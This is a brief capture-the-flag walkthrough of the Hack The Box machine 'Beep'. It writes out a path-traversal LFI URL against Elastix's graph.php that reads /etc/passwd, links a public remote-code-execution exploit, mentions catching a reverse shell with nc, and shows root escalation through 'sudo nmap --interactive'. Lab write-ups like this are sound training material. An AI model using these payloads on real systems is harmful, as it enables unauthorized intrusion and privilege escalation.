# Beep
> URL : https://app.hackthebox.eu/machines/Beep

IP : 10.129.1.226

## Recon
- 80 port is a login page
	- Elastix
![](https://i.imgur.com/4GmV8sk.png)

## Find Payload
### LFI
- Elastix 2.2.0 - 'graph.php' Local File Inclusion
	- https://www.exploit-db.com/exploits/37637
- Try LFI
	- https://10.129.1.226/vtigercrm/graph.php?current_language=../../../../../../../etc/passwd%00&module=Accounts&action
	- ![](https://i.imgur.com/pgsp4Xx.png)
- With python request script, it will throw a exception, because the ssl version is toooo ol.
	- https://stackoverflow.com/questions/32330919/python-ssl-ssl-sslerror-ssl-unsupported-protocol-unsupported-protocol-ssl
	- Use this command to change the min version of TLS
		- `sed -i 's/MinProtocol = TLSv1.2/MinProtocol = TLSv1.0/' /etc/ssl/openssl.cnf`
		- ![](https://i.imgur.com/2GDgN7e.png)
### RCE
- Find RCE Code
	- https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.py
- Turn nc to receive reverse shell
	- ![](https://i.imgur.com/5RWwCTM.png)
## Privilege Escalation
- `sudo -l` check , we can sudo `nmap`
	- ![](https://i.imgur.com/vhDoZgm.png)
- `sudo nmap --interactive`
	- https://gtfobins.github.io/gtfobins/nmap/
	- `!bash`
	- ![](https://i.imgur.com/pyCp1rO.png)
